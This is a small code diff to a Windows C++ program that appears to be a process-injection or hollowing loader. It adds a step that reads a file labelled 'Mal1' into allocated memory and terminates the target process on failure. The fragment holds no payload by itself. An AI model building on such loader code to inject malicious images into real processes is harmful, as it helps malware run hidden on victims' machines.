@@ -68,5 +68,24 @@ int main() {
 		0x04
 	);
 
+
+	DWORD numberOfBytesRead;
+
+	//Writes Mal1 into allocated memory
+	if (!ReadFile(
+		hMal1,
+		pMal1Image,
+		mal1FileSize,
+		&numberOfBytesRead,
+		NULL
+	)) {
+		std::cout << "[!] Unable to read. Error: " << GetLastError() << endl;
+		TerminateProcess(processInfo->hProcess, 0);
+		return 1;
+	}
+
+	CloseHandle(hMal1);
+	std::cout << "[+] Wrote Mal1 into memory at: 0x" << pMal1Image << endl;
+
 	return 0;
 }
